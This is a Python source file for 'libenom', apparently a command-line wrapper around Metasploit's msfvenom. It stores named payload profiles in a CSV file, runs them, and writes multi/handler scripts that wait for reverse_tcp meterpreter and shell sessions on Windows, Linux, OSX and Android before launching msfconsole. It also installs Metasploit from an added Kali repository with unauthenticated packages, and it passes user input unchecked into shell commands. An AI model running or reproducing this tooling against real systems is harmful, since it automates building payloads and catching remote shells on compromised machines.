#!/usr/bin/env python3
import sys
import argparse
import os
import subprocess
import csv
import time
from banner import header,checker

author = "By: @bounteous17"
version = "1.0.1"

class tcolors: #terminal colors
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    SKY = '\033[96m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

def browser():
    f = open('community.txt', 'r')
    print('\n'+f.read()+'\n\nCTRL+CLICK\n\nhttps://drive.google.com/folderview?id=0B8UOBHhKgUMEMVprMUIwRVRaWkU&usp=sharing\n')
    f.close()

#libenom random banner
banner = str(tcolors.GRAY+header()+tcolors.ENDC+tcolors.WHITE+tcolors.BOLD+"\n[-] You have no excuse not to order your payloads [-] - v_"+version+tcolors.ENDC)


#argparse options
parser = argparse.ArgumentParser (description='Create your own dictionary of payloads with Libenom',usage="./libenom.py -[option] [profile1,profile2]",epilog=author+" - v["+version+"]")

create = parser.add_argument_group('[Create]')
create.add_argument('-c', '--create', help="Create and asign to a user profile the parameters of the payload ex: './libenom.py -c profilename'")

delete = parser.add_argument_group('[Delete]')
delete.add_argument('-d', '--delete', help="Delete a user profile ex: './libenom.py -d oldprofile'")

execute = parser.add_argument_group('[Execute]')
execute.add_argument('-x', '--execute', type=str, help="Execute a precreated profile ex: './libenom.py -x profilename'")

edit = parser.add_argument_group('[Edit]')
edit.add_argument('-e', '--edit', type=str, help="Edit precreated IDs")

crex = parser.add_argument_group('[Create-and-execute]')
crex.add_argument('-cX', '--crex', help="Create a user profile and execute it on the same moment ex: './libenom.py -cX profilename'")

read = parser.add_argument_group('[Reader]')
read.add_argument('-r', '--read', type=str, help="Display on a table the selected profiles ex: './libenom.py -r profile1,profile2'")

listener = parser.add_argument_group('[Listener]')
listener.add_argument('-l', '--listener', type=str, help="Create an automatic listener for the selected platform ex: './libenom.py -l show'")

upload = parser.add_argument_group('[Uploader]')
upload.add_argument('-u', '--upload', dest='funcs', action='append_const',const=browser, help="Exchange your knowledge and experience with the community ex: './libenom.py -u'")

args = parser.parse_args()

if args.funcs: #for upload group
    os.system('clear')
    print(banner)
    browser()

if len(sys.argv) < 2:
    sys.exit(parser.print_help())


#some checkers
if len(sys.argv) > 2:
    os.system('clear')
    print(checker())
    if os.geteuid() != 0: #detect if the user is root
        sys.exit(tcolors.FAIL+"\n[!] Only for ROOT minds !\n"+tcolors.ENDC)
    else:
        time.sleep(1)
        print(tcolors.SKY+"::[Check user]::"+tcolors.WARNING+" ROOT"+tcolors.ENDC)
        time.sleep(1)
        if args.crex or args.execute or args.listener:
            print(tcolors.SKY+"::[Service postgresql]::"+tcolors.WARNING+" START"+tcolors.ENDC)
            os.system("service postgresql start")
            time.sleep(1)
            try:
                null = open("/dev/null", "w")
                subprocess.Popen("msfvenom", stdout=null, stderr=null)
                null.close()
                print(tcolors.SKY+"::[Msfvenom Installation]::"+tcolors.WARNING+" YES\n\n"+tcolors.ENDC)
                time.sleep(1)
                os.system('clear')
                print(banner)
            except OSError: #install msfvenom if it's not
                ins = input(tcolors.FAIL+"[!] Msfvenom not installed\nInstall it? Y/N: "+tcolors.ENDC)
                if ins == "y":
                    delete_list = ["deb http://http.kali.org/kali kali-rolling main contrib non-free"]
                    os.system('echo '+delete_list[0]+' >> /etc/apt/sources.list && apt-get update && apt-get install -y --allow-unauthenticated metasploit-framework')
                    infile = "/etc/apt/sources.list"
                    outfile = "/etc/apt/sources.list"
                    fin = open(infile)
                    os.remove("/etc/apt/sources.list")
                    fout = open(outfile, "w+")
                    for line in fin:
                        for word in delete_list:
                            line = line.replace(word, "")
                        fout.write(line)
                    fin.close()
                    fout.close()
                else:
                    sys.exit(tcolors.FAIL+"\nmetasploit-framework is esential\n"+tcolors.ENDC)
else:
    pass

#functions

def loader(): #read the information
    with open('profiles.csv') as csvfile:
    	readCSV = csv.reader(csvfile, delimiter=',')
    	perofiles = []
    	commands = []
    	for row in readCSV: #read the data and append to he lists
    		command = row[1]
    		perfil = row[0]
    		perofiles.append(perfil)
    		commands.append(command)
    	loader.whatprofile = loader.e

    try: #check if it exists
        coldex = perofiles.index(loader.whatprofile)
        loader.thecommand = commands[coldex]
    except:
        sys.exit(tcolors.FAIL+"\n[!] The profile "+loader.e+" is not in list\n"+tcolors.ENDC)

def delete():
	for d in p_name.split(','):
		os.system('cp profiles.csv /tmp/profiles.csv.bak')
		with open('/tmp/profiles.csv.bak') as infile, open('profiles.csv', 'w') as outfile:
			d = str(d)
			reader = csv.reader(infile)
			writer = csv.writer(outfile)
			newrows = (row for row in reader if row[0] != d)
			writer.writerows(newrows)
			infile.close()
			outfile.close()

def executioner(): #execute the parameters for msfvenom
    executioner.count = 1
    for loader.e in p_name.split(','):
        loader() #we use loader function to find the data and extract the command asigned to the profile
        print ("\n"+tcolors.BOLD+tcolors.SKY+loader.whatprofile+tcolors.ENDC+" => "+loader.thecommand+"\n")
        os.system("msfvenom "+loader.thecommand)
        print("\n"+tcolors.WARNING+str(executioner.count)+"/"+str(len(p_name.split(',')))+tcolors.ENDC+"\n")
        executioner.count += 1


def creator(): #add on profiles.csv the user data
    for p in p_name.split(','):
        if len(p) > 10:
            sys.exit("\n[!] Max 10 caracters\n")
        else:
            comm = input('Payload parameters for '+p+'?\n\n'+tcolors.BOLD+'msfvenom '+tcolors.ENDC)
            csv_out = p+","+comm+"\n"
            fd = open('profiles.csv','a+')
            fd.write(csv_out)
            fd.close()


def info(): #show some output info
    if str(executioner.count-1) == str(len(p_name.split(','))):
        print (tcolors.WARNING+"[*] All payloads founds\n"+tcolors.ENDC)
    else:
        print (tcolors.WARNING+"[!] Some profiles failed\n"+tcolors.ENDC)


def listener(): #create a fast meterpreter listener
    handler = "use exploit/multi/handler"
    meterpreter = str("temp/meterpreter_"+platform)
    xterm = str('xterm -e msfconsole -r '+meterpreter)
    class Handler:
        print (tcolors.WARNING+"Create a Listener and jump to Msfconsole\n"+tcolors.ENDC)

        def __init__(self,lhost,lport):
            self.lhost = lhost
            self.lport = lport

        def winDows(self):
            os.system('echo "'+handler+'\nset payload windows/meterpreter/reverse_tcp\nset lhost '+self.lhost+'\nset lport '+self.lport+'\nset exitonsession false\nexploit -j" > '+meterpreter )

        def liNux(self):
            os.system('echo "'+handler+'\nset payload linux/x86/meterpreter/reverse_tcp\nset lhost '+self.lhost+'\nset lport '+self.lport+'\nset exitonsession false\nexploit -j" > '+meterpreter )

        def osX(self):
            os.system('echo "'+handler+'\nset payload osx/x86/shell_reverse_tcp\nset lhost '+self.lhost+'\nset lport '+self.lport+'\nset exitonsession false\nexploit -j" > '+meterpreter )

        def anDroid(self):
            os.system('echo "'+handler+'\nset payload android/meterpreter/reverse_tcp\nset lhost '+self.lhost+'\nset lport '+self.lport+'\nset exitonsession false\nexploit -j" > '+meterpreter )

    if platform == "show":
        print(tcolors.SKY+"""
        ********** All Categories **********

        [-] Listeners for payload Windows [-]
        [-] Listeners for payload Linux   [-]
        [-] Listeners for payload OSX     [-]
        [-] Listeners for payload Android [-]

        """+tcolors.WARNING+"Ex. Usage: './libenom.py -l windows'\n "+tcolors.ENDC)

    elif platform == "windows":
        cone = Handler(input("LHOST => "),input("LPORT => "))
        cone.winDows()
        os.system(xterm)
    elif platform == "linux":
        cone = Handler(input("LHOST => "),input("LPORT => "))
        cone.liNux()
        os.system(xterm)
    elif platform == "osx":
        cone = Handler(input("LHOST => "),input("LPORT => "))
        cone.osX()
        os.system(xterm)
    elif platform == "android":
        cone = Handler(input("LHOST => "),input("LPORT => "))
        cone.anDroid()
        os.system(xterm)
    else:
        sys.exit(tcolors.FAIL+"\n[!] No platform recognized\n"+tcolors.ENDC)


#argparse groups
if args.create:
    os.system('clear')
    print(banner)
    print (tcolors.WARNING+"\nOption selected: [Create]\n"+tcolors.ENDC)
    p_name = args.create
    creator()

if args.delete:
    print (tcolors.WARNING+"\nOption selected: [Delete]\n"+tcolors.ENDC)
    p_name = args.delete
    delete()

if args.execute:
    print (tcolors.WARNING+"\nOption selected: [Execute]\n"+tcolors.ENDC)
    p_name = args.execute
    executioner()
    info()
    
if args.edit:
	print (tcolors.WARNING+"\nOption selected: [Edit]\n"+tcolors.ENDC)
	p_name = args.edit
	delete()
	creator()

if args.crex:
    print (tcolors.WARNING+"\nOption selected: [Create-and-execute]\n"+tcolors.ENDC)
    p_name = args.crex
    creator()
    executioner()
    info()

if args.read:
    print (tcolors.WARNING+"\nOption selected: [Reader]\n"+tcolors.ENDC)
    p_name = args.read
    count = 0
    cList = []
    pList = []
    eList = []
    for loader.e in p_name.split(','):
        p_name = loader.e
        loader()
        cList.append( loader.thecommand )
        pList.append( loader.whatprofile )
        calc = 10-len(loader.whatprofile)
        eList.append( calc )
        coin = str('|'+loader.whatprofile+' '*calc+'|'+cList[0]+' |')
        big = max(cList)
        if count == 0:
            line1 = str('+'+'-'*10+'+'+'-'*10+'+')
            line2 = str('| Profile  | Command  |')
            count += 1
    rows, columns = os.popen('stty size', 'r').read().split()
    if int(len(big)+13) > int(columns):
        sys.exit(tcolors.FAIL+"\n[!] Your terminal size is too small\n"+tcolors.ENDC)
    else:
        count = 0
        print(line1)
        print(line2)
        for o in args.read.split(','):
            spacer = len(cList[count])
            line3 = str('+----------+'+'-'*len(big)+'+')
            print (line3)
            spa = int(eList[count])
            colc = int(len(big)) - int(spacer)
            print ('|'+pList[count]+' '*spa+'|'+cList[count]+' '*colc+'|')
            count += 1
        print (line3)

if args.listener:
    print (tcolors.WARNING+"\nOption selected: [Listener]\n"+tcolors.ENDC)
    platform = args.listener
    listener()

else: #mv all the files generated to outfiles folder
    move = 'mv $(ls -I "profiles.csv" -I "libenom.py" -I "banner.py" -I "outfiles" -I "__pycache__" -I "temp" -I "community.txt" -I "LICENSE" -I "README.md") outfiles'
    subprocess.Popen(move,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
















#
